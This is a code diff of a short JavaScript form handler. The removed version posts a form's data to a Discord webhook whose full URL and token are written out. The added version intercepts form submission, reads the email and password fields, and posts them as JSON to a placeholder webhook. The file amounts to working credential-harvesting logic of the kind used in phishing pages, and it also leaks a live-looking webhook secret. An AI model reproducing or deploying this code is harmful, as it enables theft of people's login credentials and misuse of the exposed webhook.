@@ -1,28 +1,22 @@
-// Récupérer le formulaire et l'élément de bouton
 const form = document.querySelector('form');
-const button = document.querySelector('button');
-
-// Ajouter un écouteur d'événements au bouton
-button.addEventListener('click', () => {
-  // Récupérer les données du formulaire
-  const data = new FormData(form);
-
-  // Configurer l'URL du webhook et les options de la requête
-  const url = 'https://discord.com/api/webhooks/1103319312900567192/3SWoHjepeUxQEShb8Y2SFO-DJZNED1Cu6z49g6RT0_Z_6Zref4z5_0rYWQ4X9zvoilZN';
-  const options = {
-    method: 'POST',
-    body: data,
-  };
-
-  // Envoyer la requête au webhook
-  fetch(url, options)
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Erreur lors de l\'envoi des données au webhook.');
-      }
-      console.log('Les données ont été envoyées avec succès au webhook.');
-    })
-    .catch(error => {
-      console.error(error);
+form.addEventListener('submit', async (event) => {
+  event.preventDefault();
+  const email = event.target.elements.email.value;
+  const password = event.target.elements.password.value;
+  const webhookUrl = 'https://example.com/webhook';
+  const data = { email, password };
+  try {
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
     });
+    if (response.ok) {
+      console.log('Webhook sent successfully!');
+    } else {
+      console.error('Error sending webhook:', response.statusText);
+    }
+  } catch (error) {
+    console.error('Error sending webhook:', error);
+  }
 });
